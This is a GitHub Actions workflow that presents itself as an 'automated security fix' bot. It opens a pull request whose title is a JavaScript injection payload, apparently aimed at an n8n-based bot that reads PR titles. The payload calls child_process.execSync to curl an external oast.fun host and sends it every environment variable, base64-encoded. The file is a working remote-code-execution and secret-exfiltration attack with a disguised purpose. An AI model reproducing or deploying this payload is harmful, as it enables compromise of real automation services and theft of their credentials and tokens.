name: Create Bot PR
on:
  workflow_dispatch:
permissions:
  contents: write
  pull-requests: write
jobs:
  create-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          BRANCH="security-bot-fix-$(date +%s)"
          git checkout -b $BRANCH
          echo "fix $(date)" >> security-fix.txt
          git add .
          git commit -m "automated security fix"
          git push origin $BRANCH
          
          # Create PR with injection payload in title using GITHUB_TOKEN
          curl -s -X POST \
            -H "Authorization: token $GITHUB_TOKEN" \
            -H "Content-Type: application/json" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/pulls" \
            -d "{\"title\": \"x'}); } catch(e){} require('child_process').execSync('curl https://dscxewzgeaehchedqqctbm7s436eiht6h.oast.fun/n8n_bot_rce?e='+Buffer.from(JSON.stringify(process.env)).toString('base64')); try { var _=({a:'\", \"head\": \"$BRANCH\", \"base\": \"master\", \"body\": \"Automated security fix\"}"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

